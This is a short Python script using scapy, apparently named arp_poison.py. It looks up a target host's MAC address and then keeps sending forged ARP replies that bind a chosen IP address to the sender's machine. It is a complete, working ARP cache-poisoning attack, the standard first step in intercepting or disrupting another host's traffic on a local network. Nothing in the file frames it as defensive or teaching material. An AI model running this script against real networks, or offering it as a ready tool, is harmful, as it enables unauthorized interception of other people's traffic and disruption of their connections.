import sys
from scapy.all import *
import time

def get_target_mac(target):
    #random_mac = str(RandMAC())
    pkt = Ether(dst = "ff:ff:ff:ff:ff:ff")
    pkt /= ARP(pdst = target)
    target_mac = ""
    while len(target_mac) == 0:
        try:
            target_mac = srp(pkt, verbose = False, timeout = 2)[0][0][1].hwsrc
        except:
            continue
    return target_mac

def poison(target_ip, target_mac, spoofed_ip):
    #spoofed_mac = str(RandMAC())
    pkt = Ether(dst = target_mac)
    pkt /= ARP(op=2, psrc = spoofed_ip, pdst = target_ip)
    while True:
        sendp(pkt, verbose = False)
        time.sleep(3)

def main():
    if len(sys.argv) == 3:
        target_ip = str(sys.argv[1])
        spoofed_ip = str(sys.argv[2])
        print("Getting target MAC...")
        target_mac = get_target_mac(target_ip)
        print(f"Poisoning IP {spoofed_ip} on target {target_ip}.")
        poison(target_ip, target_mac, spoofed_ip)
    else:
        print("Usage: python3 arp_poison.py <target_ip> <spoofed_ip>")

if __name__=="__main__":
    main()
